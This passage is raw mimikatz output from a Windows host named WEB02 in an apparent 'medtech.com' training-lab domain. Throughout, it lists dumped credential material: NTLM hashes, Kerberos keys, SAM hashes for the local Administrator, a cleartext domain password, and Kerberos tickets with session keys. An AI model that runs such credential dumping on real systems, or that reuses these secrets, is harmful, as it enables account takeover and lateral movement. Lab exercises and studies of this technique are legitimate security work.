  * DPAPI    : 58de53296298ce0f98087ae902c88735
 tspkg :
 wdigest :
  * Username : joe
  * Domain   : MEDTECH
  * Password : (null)
 kerberos :
  * Username : joe
  * Domain   : MEDTECH.COM
  * Password : (null)
 ssp :
 credman :
 cloudap :

Authentication Id : 0 ; 283886 (00000000:000454ee)
Session           : Service from 0
User Name         : joe
Domain            : MEDTECH
Logon Server      : DC01
Logon Time        : 4/8/2024 12:06:58 PM
SID               : S-1-5-21-976142013-3766213998-138799841-1106
 msv :
  [00000003] Primary
  * Username : joe
  * Domain   : MEDTECH
  * NTLM     : 08d7a47a6f9f66b97b1bae4178747494
  * SHA1     : a0c2285bfad20cc614e2d361d6246579843557cd
  * DPAPI    : 58de53296298ce0f98087ae902c88735
 tspkg :
 wdigest :
  * Username : joe
  * Domain   : MEDTECH
  * Password : (null)
 kerberos :
  * Username : joe
  * Domain   : MEDTECH.COM
  * Password : Flowers1
 ssp :
 credman :
 cloudap :

Authentication Id : 0 ; 995 (00000000:000003e3)
Session           : Service from 0
User Name         : IUSR
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 4/8/2024 12:06:46 PM
SID               : S-1-5-17
 msv :
 tspkg :
 wdigest :
  * Username : (null)
  * Domain   : (null)
  * Password : (null)
 kerberos :
 ssp :
 credman :
 cloudap :

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 4/8/2024 12:06:45 PM
SID               : S-1-5-19
 msv :
 tspkg :
 wdigest :
  * Username : (null)
  * Domain   : (null)
  * Password : (null)
 kerberos :
  * Username : (null)
  * Domain   : (null)
  * Password : (null)
 ssp :
 credman :
 cloudap :

Authentication Id : 0 ; 47684 (00000000:0000ba44)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 4/8/2024 12:06:45 PM
SID               : S-1-5-96-0-0
 msv :
  [00000003] Primary
  * Username : WEB02$
  * Domain   : MEDTECH
  * NTLM     : 40a78a0bbf7fb3f1b7af31ae61e401c8
  * SHA1     : aa174c43d5553834eacc9a3d77a9b0134a1ba098
 tspkg :
 wdigest :
  * Username : WEB02$
  * Domain   : MEDTECH
  * Password : (null)
 kerberos :
  * Username : WEB02$
  * Domain   : medtech.com
  * Password : 72 33 71 ea 51 dd 81 01 83 89 46 39 12 2e d2 03 71 48 99 0d 34 d9 53 22 eb e4 bb 3d 28 79 af f1 7b c4 3b d7 95 8f bc 59 2e 66 b3 83 7b 0b 0f a8 7b b2 ff 51 9e b4 64 e0 4a 61 a7 dd fc 17 24 b0 23 87 d2 eb f3 bd 7b 01 43 9d 96 96 c3 1e ea 8f d7 64 d9 03 fd 0f ff 1a ab 1b 35 d5 00 a8 fa 39 e6 e9 fb 1a d7 51 91 8a d0 d1 d1 9f a2 c5 90 a6 4f 43 0f dd a5 59 57 e1 b2 de db e6 6c 7e 26 57 a7 b9 70 ec 33 74 f5 d5 30 49 08 2a cb 5b c0 fa 80 e0 e7 35 24 59 9a 28 22 30 bc 08 3b 7d a9 b0 ed f8 32 a8 6f ab f2 88 31 c6 9c 4c e2 4f 15 f1 02 b6 6c 70 70 07 6b 4c ac 1c 2c bf d9 02 26 ae e9 f6 ce 4d 65 83 a7 3c 0a 1d 1c 2d 02 1c bd cc 93 d4 ff 0f d9 ce 54 95 b7 c0 c7 42 f7 f5 7c 47 17 fa 0f 4d 69 b4 2f 89 65 f7 4e d1 83 f8 8a 9f 
 ssp :
 credman :
 cloudap :

Authentication Id : 0 ; 47650 (00000000:0000ba22)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 4/8/2024 12:06:45 PM
SID               : S-1-5-96-0-1
 msv :
  [00000003] Primary
  * Username : WEB02$
  * Domain   : MEDTECH
  * NTLM     : 40a78a0bbf7fb3f1b7af31ae61e401c8
  * SHA1     : aa174c43d5553834eacc9a3d77a9b0134a1ba098
 tspkg :
 wdigest :
  * Username : WEB02$
  * Domain   : MEDTECH
  * Password : (null)
 kerberos :
  * Username : WEB02$
  * Domain   : medtech.com
  * Password : 72 33 71 ea 51 dd 81 01 83 89 46 39 12 2e d2 03 71 48 99 0d 34 d9 53 22 eb e4 bb 3d 28 79 af f1 7b c4 3b d7 95 8f bc 59 2e 66 b3 83 7b 0b 0f a8 7b b2 ff 51 9e b4 64 e0 4a 61 a7 dd fc 17 24 b0 23 87 d2 eb f3 bd 7b 01 43 9d 96 96 c3 1e ea 8f d7 64 d9 03 fd 0f ff 1a ab 1b 35 d5 00 a8 fa 39 e6 e9 fb 1a d7 51 91 8a d0 d1 d1 9f a2 c5 90 a6 4f 43 0f dd a5 59 57 e1 b2 de db e6 6c 7e 26 57 a7 b9 70 ec 33 74 f5 d5 30 49 08 2a cb 5b c0 fa 80 e0 e7 35 24 59 9a 28 22 30 bc 08 3b 7d a9 b0 ed f8 32 a8 6f ab f2 88 31 c6 9c 4c e2 4f 15 f1 02 b6 6c 70 70 07 6b 4c ac 1c 2c bf d9 02 26 ae e9 f6 ce 4d 65 83 a7 3c 0a 1d 1c 2d 02 1c bd cc 93 d4 ff 0f d9 ce 54 95 b7 c0 c7 42 f7 f5 7c 47 17 fa 0f 4d 69 b4 2f 89 65 f7 4e d1 83 f8 8a 9f 
 ssp :
 credman :
 cloudap :

Authentication Id : 0 ; 46401 (00000000:0000b541)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 4/8/2024 12:06:45 PM
SID               : 
 msv :
  [00000003] Primary
  * Username : WEB02$
  * Domain   : MEDTECH
  * NTLM     : 40a78a0bbf7fb3f1b7af31ae61e401c8
  * SHA1     : aa174c43d5553834eacc9a3d77a9b0134a1ba098
 tspkg :
 wdigest :
 kerberos :
 ssp :
 credman :
 cloudap :

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : WEB02$
Domain            : MEDTECH
Logon Server      : (null)
Logon Time        : 4/8/2024 12:06:45 PM
SID               : S-1-5-18
 msv :
 tspkg :
 wdigest :
  * Username : WEB02$
  * Domain   : MEDTECH
  * Password : (null)
 kerberos :
  * Username : web02$
  * Domain   : MEDTECH.COM
  * Password : 72 33 71 ea 51 dd 81 01 83 89 46 39 12 2e d2 03 71 48 99 0d 34 d9 53 22 eb e4 bb 3d 28 79 af f1 7b c4 3b d7 95 8f bc 59 2e 66 b3 83 7b 0b 0f a8 7b b2 ff 51 9e b4 64 e0 4a 61 a7 dd fc 17 24 b0 23 87 d2 eb f3 bd 7b 01 43 9d 96 96 c3 1e ea 8f d7 64 d9 03 fd 0f ff 1a ab 1b 35 d5 00 a8 fa 39 e6 e9 fb 1a d7 51 91 8a d0 d1 d1 9f a2 c5 90 a6 4f 43 0f dd a5 59 57 e1 b2 de db e6 6c 7e 26 57 a7 b9 70 ec 33 74 f5 d5 30 49 08 2a cb 5b c0 fa 80 e0 e7 35 24 59 9a 28 22 30 bc 08 3b 7d a9 b0 ed f8 32 a8 6f ab f2 88 31 c6 9c 4c e2 4f 15 f1 02 b6 6c 70 70 07 6b 4c ac 1c 2c bf d9 02 26 ae e9 f6 ce 4d 65 83 a7 3c 0a 1d 1c 2d 02 1c bd cc 93 d4 ff 0f d9 ce 54 95 b7 c0 c7 42 f7 f5 7c 47 17 fa 0f 4d 69 b4 2f 89 65 f7 4e d1 83 f8 8a 9f 
 ssp :
 credman :
 cloudap :

mimikatz(commandline) # lsadump::sam
Domain : WEB02
SysKey : 15e1050a6b4a11f2c1ebe8aaa2a80fc5
Local SID : S-1-5-21-1364059446-3280107051-2039649012

SAMKey : 1dd3b266888c2bb4f270483ebdd141ed

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: b2c03054c306ac8fc5f9d188710b0168
    lm  - 0: 9ae9650d77f386f17ad7b5fbe3c258ed
    lm  - 1: 60a263c786b67624310f068dd2bdbf36
    lm  - 2: 3f2da14065c9b96f4335b4dff3bb50a1
    ntlm- 0: b2c03054c306ac8fc5f9d188710b0168
    ntlm- 1: 863ebf87756cc17378b73c5a599ee46e
    ntlm- 2: 576040e23ff4f555df56af70c2b0a03d
    ntlm- 3: 2892d26cdf84d7a70e2eb3b9f05c425e

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 78545336291230ed3aab6ddfff516f48

* Primary:Kerberos-Newer-Keys *
    Default Salt : WEB02.DMZ.MEDTECH.COMAdministrator
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : fa99d6b74b154911e525f31e4a6e37e93420314e7e2f1c4165601c92718e65d6
      aes128_hmac       (4096) : 281686b7e7d3bae37d3c913ae08dc032
      des_cbc_md5       (4096) : d6c4163829ae3e40
    OldCredentials
      aes256_hmac       (4096) : e3f2be756239160382af4d970e45d81feb688f388b4f7568c16b117bc459c190
      aes128_hmac       (4096) : 2e9209ff3f1ca2073cc35c4e13d5ddc6
      des_cbc_md5       (4096) : dc9e6ef758468cd9
    OlderCredentials
      aes256_hmac       (4096) : 93ae69ec35510b330c38a5132e051259bc41bc649d705fcf8d8b5890e496e2b5
      aes128_hmac       (4096) : bf7e4780774fbf82cccb2c1a9a9f7180
      des_cbc_md5       (4096) : 8fb5d940017aa7f2

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : WEB02.DMZ.MEDTECH.COMAdministrator
    Credentials
      des_cbc_md5       : d6c4163829ae3e40
    OldCredentials
      des_cbc_md5       : dc9e6ef758468cd9


RID  : 000001f5 (501)
User : Guest

RID  : 000001f7 (503)
User : DefaultAccount

RID  : 000001f8 (504)
User : WDAGUtilityAccount
  Hash NTLM: 6085c974624ef685a86737c960a5d405

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 9380affa0f0060f0a8d876e5026bfa80

* Primary:Kerberos-Newer-Keys *
    Default Salt : WDAGUtilityAccount
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : c386ee013b1cfc80644041b7a2f5787afcc33d05afca9273bc1fedd8e6a2bd21
      aes128_hmac       (4096) : 230c2ab621faff621b24fccba6024c95
      des_cbc_md5       (4096) : 2608abd5a2dc76a4

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : WDAGUtilityAccount
    Credentials
      des_cbc_md5       : 2608abd5a2dc76a4


RID  : 000003e8 (1000)
User : offsec
  Hash NTLM: 2892d26cdf84d7a70e2eb3b9f05c425e

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : f5c00983aa20003f714f787f65a83903

* Primary:Kerberos-Newer-Keys *
    Default Salt : WIN-LV5NL5EF060offsec
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : bd1f8259da72ba3b7b8ff1d5fe53cb305022ecabbba5d8a9a29054bc14c62f69
      aes128_hmac       (4096) : 677e69758f2afe35b2b00108d52e7adf
      des_cbc_md5       (4096) : 61452fbad3e0c48c

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : WIN-LV5NL5EF060offsec
    Credentials
      des_cbc_md5       : 61452fbad3e0c48c


mimikatz(commandline) # sekurlsa::tickets

Authentication Id : 0 ; 1111014 (00000000:0010f3e6)
Session           : Service from 0
User Name         : DefaultAppPool
Domain            : IIS APPPOOL
Logon Server      : (null)
Logon Time        : 8/6/2025 4:21:22 AM
SID               : S-1-5-82-3006700770-424185619-1745488364-794895919-4004696415

  * Username : WEB02$
  * Domain   : medtech.com
  * Password : 72 33 71 ea 51 dd 81 01 83 89 46 39 12 2e d2 03 71 48 99 0d 34 d9 53 22 eb e4 bb 3d 28 79 af f1 7b c4 3b d7 95 8f bc 59 2e 66 b3 83 7b 0b 0f a8 7b b2 ff 51 9e b4 64 e0 4a 61 a7 dd fc 17 24 b0 23 87 d2 eb f3 bd 7b 01 43 9d 96 96 c3 1e ea 8f d7 64 d9 03 fd 0f ff 1a ab 1b 35 d5 00 a8 fa 39 e6 e9 fb 1a d7 51 91 8a d0 d1 d1 9f a2 c5 90 a6 4f 43 0f dd a5 59 57 e1 b2 de db e6 6c 7e 26 57 a7 b9 70 ec 33 74 f5 d5 30 49 08 2a cb 5b c0 fa 80 e0 e7 35 24 59 9a 28 22 30 bc 08 3b 7d a9 b0 ed f8 32 a8 6f ab f2 88 31 c6 9c 4c e2 4f 15 f1 02 b6 6c 70 70 07 6b 4c ac 1c 2c bf d9 02 26 ae e9 f6 ce 4d 65 83 a7 3c 0a 1d 1c 2d 02 1c bd cc 93 d4 ff 0f d9 ce 54 95 b7 c0 c7 42 f7 f5 7c 47 17 fa 0f 4d 69 b4 2f 89 65 f7 4e d1 83 f8 8a 9f 

 Group 0 - Ticket Granting Service

 Group 1 - Client Ticket ?

 Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 753961 (00000000:000b8129)
Session           : Batch from 0
User Name         : Administrator
Domain            : WEB02
Logon Server      : WEB02
Logon Time        : 4/8/2024 12:09:09 PM
SID               : S-1-5-21-1364059446-3280107051-2039649012-500

  * Username : Administrator
  * Domain   : WEB02
  * Password : (null)

 Group 0 - Ticket Granting Service

 Group 1 - Client Ticket ?

 Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 283887 (00000000:000454ef)
Session           : Service from 0
User Name         : joe
Domain            : MEDTECH
Logon Server      : DC01
Logon Time        : 4/8/2024 12:06:58 PM
SID               : S-1-5-21-976142013-3766213998-138799841-1106

  * Username : joe
  * Domain   : MEDTECH.COM
  * Password : Flowers1

 Group 0 - Ticket Granting Service

 Group 1 - Client Ticket ?

 Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 122048 (00000000:0001dcc0)
Session           : Service from 0
User Name         : MSSQL$SQLEXPRESS
Domain            : NT Service
Logon Server      : (null)
Logon Time        : 4/8/2024 12:06:46 PM
SID               : S-1-5-80-3880006512-4290199581-1648723128-3569869737-3631323133

  * Username : WEB02$
  * Domain   : medtech.com
  * Password : 72 33 71 ea 51 dd 81 01 83 89 46 39 12 2e d2 03 71 48 99 0d 34 d9 53 22 eb e4 bb 3d 28 79 af f1 7b c4 3b d7 95 8f bc 59 2e 66 b3 83 7b 0b 0f a8 7b b2 ff 51 9e b4 64 e0 4a 61 a7 dd fc 17 24 b0 23 87 d2 eb f3 bd 7b 01 43 9d 96 96 c3 1e ea 8f d7 64 d9 03 fd 0f ff 1a ab 1b 35 d5 00 a8 fa 39 e6 e9 fb 1a d7 51 91 8a d0 d1 d1 9f a2 c5 90 a6 4f 43 0f dd a5 59 57 e1 b2 de db e6 6c 7e 26 57 a7 b9 70 ec 33 74 f5 d5 30 49 08 2a cb 5b c0 fa 80 e0 e7 35 24 59 9a 28 22 30 bc 08 3b 7d a9 b0 ed f8 32 a8 6f ab f2 88 31 c6 9c 4c e2 4f 15 f1 02 b6 6c 70 70 07 6b 4c ac 1c 2c bf d9 02 26 ae e9 f6 ce 4d 65 83 a7 3c 0a 1d 1c 2d 02 1c bd cc 93 d4 ff 0f d9 ce 54 95 b7 c0 c7 42 f7 f5 7c 47 17 fa 0f 4d 69 b4 2f 89 65 f7 4e d1 83 f8 8a 9f 

 Group 0 - Ticket Granting Service

 Group 1 - Client Ticket ?

 Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 121422 (00000000:0001da4e)
Session           : Service from 0
User Name         : SQLTELEMETRY$SQLEXPRESS
Domain            : NT Service
Logon Server      : (null)
Logon Time        : 4/8/2024 12:06:46 PM
SID               : S-1-5-80-1985561900-798682989-2213159822-1904180398-3434236965

  * Username : WEB02$
  * Domain   : medtech.com
  * Password : 72 33 71 ea 51 dd 81 01 83 89 46 39 12 2e d2 03 71 48 99 0d 34 d9 53 22 eb e4 bb 3d 28 79 af f1 7b c4 3b d7 95 8f bc 59 2e 66 b3 83 7b 0b 0f a8 7b b2 ff 51 9e b4 64 e0 4a 61 a7 dd fc 17 24 b0 23 87 d2 eb f3 bd 7b 01 43 9d 96 96 c3 1e ea 8f d7 64 d9 03 fd 0f ff 1a ab 1b 35 d5 00 a8 fa 39 e6 e9 fb 1a d7 51 91 8a d0 d1 d1 9f a2 c5 90 a6 4f 43 0f dd a5 59 57 e1 b2 de db e6 6c 7e 26 57 a7 b9 70 ec 33 74 f5 d5 30 49 08 2a cb 5b c0 fa 80 e0 e7 35 24 59 9a 28 22 30 bc 08 3b 7d a9 b0 ed f8 32 a8 6f ab f2 88 31 c6 9c 4c e2 4f 15 f1 02 b6 6c 70 70 07 6b 4c ac 1c 2c bf d9 02 26 ae e9 f6 ce 4d 65 83 a7 3c 0a 1d 1c 2d 02 1c bd cc 93 d4 ff 0f d9 ce 54 95 b7 c0 c7 42 f7 f5 7c 47 17 fa 0f 4d 69 b4 2f 89 65 f7 4e d1 83 f8 8a 9f 

 Group 0 - Ticket Granting Service

 Group 1 - Client Ticket ?

 Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 80038 (00000000:000138a6)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 4/8/2024 12:06:45 PM
SID               : S-1-5-90-0-1

  * Username : WEB02$
  * Domain   : medtech.com
  * Password : ad 90 b4 19 89 a2 4d a1 d8 76 a9 cd 8c 3c 0d e8 ed 94 3d f6 80 2d 1c 6c af 70 65 28 20 75 29 6c 35 dd ae 7f 24 67 f3 c3 1e b2 c8 39 f4 35 a4 8c 39 3a 5b 3f 4f 86 6c 36 34 df f7 d5 4f ba 8c 5d 96 56 10 20 a2 46 69 70 3b 17 73 e9 d0 6f 18 b4 db 31 6d 88 f6 be ca 4b 8b a8 4e b9 b9 b9 05 6e b7 5f be 69 58 63 58 bb 3f 1a 86 33 ec cb 74 da 05 c5 31 aa 26 bf cd 51 7e a4 2c 44 f7 18 eb 16 ba 36 db 3d d3 89 36 46 04 c7 a7 9e f7 bc 28 5a 7c 99 f3 8a da c1 6b af bb ef ea a5 71 30 1a 3d 35 6b eb 44 da d4 58 7b b9 59 4b 42 7b f1 93 7b 04 92 f3 30 9e 12 f8 fe ec fd 8b f5 ca 06 a7 ce f6 6f 85 80 33 dc 92 95 1b 6d ca 5d ea df 7b 86 50 a6 f1 e1 92 4e d4 5c 2f f0 e9 f1 71 79 eb 56 64 2a ca 05 89 aa d3 25 84 1f 17 d1 57 ab 0b 16 

 Group 0 - Ticket Granting Service

 Group 1 - Client Ticket ?

 Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 80006 (00000000:00013886)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 4/8/2024 12:06:45 PM
SID               : S-1-5-90-0-1

  * Username : WEB02$
  * Domain   : medtech.com
  * Password : 72 33 71 ea 51 dd 81 01 83 89 46 39 12 2e d2 03 71 48 99 0d 34 d9 53 22 eb e4 bb 3d 28 79 af f1 7b c4 3b d7 95 8f bc 59 2e 66 b3 83 7b 0b 0f a8 7b b2 ff 51 9e b4 64 e0 4a 61 a7 dd fc 17 24 b0 23 87 d2 eb f3 bd 7b 01 43 9d 96 96 c3 1e ea 8f d7 64 d9 03 fd 0f ff 1a ab 1b 35 d5 00 a8 fa 39 e6 e9 fb 1a d7 51 91 8a d0 d1 d1 9f a2 c5 90 a6 4f 43 0f dd a5 59 57 e1 b2 de db e6 6c 7e 26 57 a7 b9 70 ec 33 74 f5 d5 30 49 08 2a cb 5b c0 fa 80 e0 e7 35 24 59 9a 28 22 30 bc 08 3b 7d a9 b0 ed f8 32 a8 6f ab f2 88 31 c6 9c 4c e2 4f 15 f1 02 b6 6c 70 70 07 6b 4c ac 1c 2c bf d9 02 26 ae e9 f6 ce 4d 65 83 a7 3c 0a 1d 1c 2d 02 1c bd cc 93 d4 ff 0f d9 ce 54 95 b7 c0 c7 42 f7 f5 7c 47 17 fa 0f 4d 69 b4 2f 89 65 f7 4e d1 83 f8 8a 9f 

 Group 0 - Ticket Granting Service

 Group 1 - Client Ticket ?

 Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : WEB02$
Domain            : MEDTECH
Logon Server      : (null)
Logon Time        : 4/8/2024 12:06:45 PM
SID               : S-1-5-20

  * Username : web02$
  * Domain   : MEDTECH.COM
  * Password : 72 33 71 ea 51 dd 81 01 83 89 46 39 12 2e d2 03 71 48 99 0d 34 d9 53 22 eb e4 bb 3d 28 79 af f1 7b c4 3b d7 95 8f bc 59 2e 66 b3 83 7b 0b 0f a8 7b b2 ff 51 9e b4 64 e0 4a 61 a7 dd fc 17 24 b0 23 87 d2 eb f3 bd 7b 01 43 9d 96 96 c3 1e ea 8f d7 64 d9 03 fd 0f ff 1a ab 1b 35 d5 00 a8 fa 39 e6 e9 fb 1a d7 51 91 8a d0 d1 d1 9f a2 c5 90 a6 4f 43 0f dd a5 59 57 e1 b2 de db e6 6c 7e 26 57 a7 b9 70 ec 33 74 f5 d5 30 49 08 2a cb 5b c0 fa 80 e0 e7 35 24 59 9a 28 22 30 bc 08 3b 7d a9 b0 ed f8 32 a8 6f ab f2 88 31 c6 9c 4c e2 4f 15 f1 02 b6 6c 70 70 07 6b 4c ac 1c 2c bf d9 02 26 ae e9 f6 ce 4d 65 83 a7 3c 0a 1d 1c 2d 02 1c bd cc 93 d4 ff 0f d9 ce 54 95 b7 c0 c7 42 f7 f5 7c 47 17 fa 0f 4d 69 b4 2f 89 65 f7 4e d1 83 f8 8a 9f 

 Group 0 - Ticket Granting Service
  [00000000]
    Start/End/MaxRenew: 8/6/2025 4:19:28 AM ; 8/6/2025 2:18:29 PM ; 8/13/2025 4:18:29 AM
    Service Name (02) : cifs ; DC01.medtech.com ; @ MEDTECH.COM
    Target Name  (02) : cifs ; DC01.medtech.com ; @ MEDTECH.COM
    Client Name  (01) : WEB02$ ; @ MEDTECH.COM
    Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ; 
    Session Key       : 0x00000001 - des_cbc_crc      
      8241a2236c74dd6fee1c171801428283553e0a171c1fc70aa026ead5886e8c4b
    Ticket            : 0x00000012 - aes256_hmac       ; kvno = 8 [...]
  [00000001]
    Start/End/MaxRenew: 8/6/2025 4:18:32 AM ; 8/6/2025 2:18:29 PM ; 8/13/2025 4:18:29 AM
    Service Name (02) : ldap ; dc01.medtech.com ; medtech.com ; @ MEDTECH.COM
    Target Name  (02) : ldap ; dc01.medtech.com ; medtech.com ; @ MEDTECH.COM
    Client Name  (01) : WEB02$ ; @ MEDTECH.COM ( MEDTECH.COM )
    Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ; 
    Session Key       : 0x00000001 - des_cbc_crc      
      8cd844ec2a0487e6e75ea32f905fbbcdeed7ffb28ad921e7817eccb32cee3bff
    Ticket            : 0x00000012 - aes256_hmac       ; kvno = 8 [...]
  [00000002]
    Start/End/MaxRenew: 8/6/2025 4:18:31 AM ; 8/6/2025 2:18:29 PM ; 8/13/2025 4:18:29 AM
    Service Name (02) : DNS ; dc01.medtech.com ; @ MEDTECH.COM
    Target Name  (02) : DNS ; dc01.medtech.com ; @ MEDTECH.COM
    Client Name  (01) : WEB02$ ; @ MEDTECH.COM
    Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ; 
    Session Key       : 0x00000001 - des_cbc_crc      
      efd6c818640c25ef8059e476d6533a3f7788a88c1880db6e0229115abbd6365d
    Ticket            : 0x00000012 - aes256_hmac       ; kvno = 8 [...]
  [00000003]
    Start/End/MaxRenew: 8/6/2025 4:18:29 AM ; 8/6/2025 2:18:29 PM ; 8/13/2025 4:18:29 AM
    Service Name (02) : ldap ; dc01.medtech.com ; @ MEDTECH.COM
    Target Name  (02) : ldap ; dc01.medtech.com ; @ MEDTECH.COM
    Client Name  (01) : WEB02$ ; @ MEDTECH.COM
    Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ; 
    Session Key       : 0x00000001 - des_cbc_crc      
      c7c7621fc77cd723a2c1a9f62ff1db7bc923ba72f3b2a9a4fae260b0579c2747
    Ticket            : 0x00000012 - aes256_hmac       ; kvno = 8 [...]

 Group 1 - Client Ticket ?

 Group 2 - Ticket Granting Ticket
  [00000000]
    Start/End/MaxRenew: 8/6/2025 4:18:31 AM ; 8/6/2025 2:18:29 PM ; 8/13/2025 4:18:29 AM
    Service Name (02) : krbtgt ; MEDTECH.COM ; @ MEDTECH.COM
    Target Name  (--) : @ MEDTECH.COM
    Client Name  (01) : WEB02$ ; @ MEDTECH.COM ( $$Delegation Ticket$$ )
    Flags 60a10000    : name_canonicalize ; pre_authent ; renewable ; forwarded ; forwardable ; 
    Session Key       : 0x00000001 - des_cbc_crc      
      bb51c7feb59d5c02e1b42d7ea14e5edce0f31ca37a4e86c0bac3cc64f89cfde9
    Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2 [...]
  [00000001]
    Start/End/MaxRenew: 8/6/2025 4:18:29 AM ; 8/6/2025 2:18:29 PM ; 8/13/2025 4:18:29 AM
    Service Name (02) : krbtgt ; MEDTECH.COM ; @ MEDTECH.COM
    Target Name  (02) : krbtgt ; medtech.com ; @ MEDTECH.COM
    Client Name  (01) : WEB02$ ; @ MEDTECH.COM ( medtech.com )
    Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ; 
    Session Key       : 0x00000001 - des_cbc_crc      
      d87a2123e65f25c1184e163b73c9ed75ad2f3c27db9bc9f028e4b9f73aad4cfd
    Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2 [...]

Authentication Id : 0 ; 681881 (00000000:000a6799)
Session           : Service from 0
User Name         : MSSQL$MICROSOFT##WID
Domain            : NT SERVICE
Logon Server      : (null)
Logon Time        : 4/8/2024 12:08:59 PM
SID               : S-1-5-80-1184457765-4068085190-3456807688-2200952327-3769537534

  * Username : WEB02$
  * Domain   : medtech.com
  * Password : 72 33 71 ea 51 dd 81 01 83 89 46 39 12 2e d2 03 71 48 99 0d 34 d9 53 22 eb e4 bb 3d 28 79 af f1 7b c4 3b d7 95 8f bc 59 2e 66 b3 83 7b 0b 0f a8 7b b2 ff 51 9e b4 64 e0 4a 61 a7 dd fc 17 24 b0 23 87 d2 eb f3 bd 7b 01 43 9d 96 96 c3 1e ea 8f d7 64 d9 03 fd 0f ff 1a ab 1b 35 d5 00 a8 fa 39 e6 e9 fb 1a d7 51 91 8a d0 d1 d1 9f a2 c5 90 a6 4f 43 0f dd a5 59 57 e1 b2 de db e6 6c 7e 26 57 a7 b9 70 ec 33 74 f5 d5 30 49 08 2a cb 5b c0 fa 80 e0 e7 35 24 59 9a 28 22 30 bc 08 3b 7d a9 b0 ed f8 32 a8 6f ab f2 88 31 c6 9c 4c e2 4f 15 f1 02 b6 6c 70 70 07 6b 4c ac 1c 2c bf d9 02 26 ae e9 f6 ce 4d 65 83 a7 3c 0a 1d 1c 2d 02 1c bd cc 93 d4 ff 0f d9 ce 54 95 b7 c0 c7 42 f7 f5 7c 47 17 fa 0f 4d 69 b4 2f 89 65 f7 4e d1 83 f8 8a 9f 

 Group 0 - Ticket Granting Service

 Group 1 - Client Ticket ?

 Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 331740 (00000000:00050fdc)
Session           : Interactive from 1
User Name         : joe
Domain            : MEDTECH
Logon Server      : DC01
Logon Time        : 4/8/2024 12:07:00 PM
SID               : S-1-5-21-976142013-3766213998-138799841-1106

  * Username : joe
  * Domain   : MEDTECH.COM
  * Password : (null)

 Group 0 - Ticket Granting Service
  [00000000]
    Start/End/MaxRenew: 8/6/2025 4:19:31 AM ; 8/6/2025 2:19:31 PM ; 8/13/2025 4:19:31 AM
    Service Name (02) : LDAP ; DC01.medtech.com ; medtech.com ; @ MEDTECH.COM
    Target Name  (02) : LDAP ; DC01.medtech.com ; medtech.com ; @ MEDTECH.COM
    Client Name  (01) : joe ; @ MEDTECH.COM ( MEDTECH.COM )
    Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ; 
    Session Key       : 0x00000001 - des_cbc_crc      
      c8e24bbcd6e2964539fe47e98c6b210dc26e11aaad5b493bdce1a1981e36c540
    Ticket            : 0x00000012 - aes256_hmac       ; kvno = 8 [...]

 Group 1 - Client Ticket ?

 Group 2 - Ticket Granting Ticket
  [00000000]
    Start/End/MaxRenew: 8/6/2025 4:19:31 AM ; 8/6/2025 2:19:31 PM ; 8/13/2025 4:19:31 AM
    Service Name (02) : krbtgt ; MEDTECH.COM ; @ MEDTECH.COM
    Target Name  (02) : krbtgt ; MEDTECH.COM ; @ MEDTECH.COM
    Client Name  (01) : joe ; @ MEDTECH.COM ( MEDTECH.COM )
    Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ; 
    Session Key       : 0x00000001 - des_cbc_crc      
      f8fe21c0a7bed46c1c9e170cbee8fa9dbbcb54f2240357069f665fa1838aa3cf
    Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2 [...]

Authentication Id : 0 ; 283886 (00000000:000454ee)
Session           : Service from 0
User Name         : joe
Domain            : MEDTECH
Logon Server      : DC01
Logon Time        : 4/8/2024 12:06:58 PM
SID               : S-1-5-21-976142013-3766213998-138799841-1106

  * Username : joe
  * Domain   : MEDTECH.COM
  * Password : Flowers1

 Group 0 - Ticket Granting Service

 Group 1 - Client Ticket ?

 Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 4/8/2024 12:06:45 PM
SID               : S-1-5-19

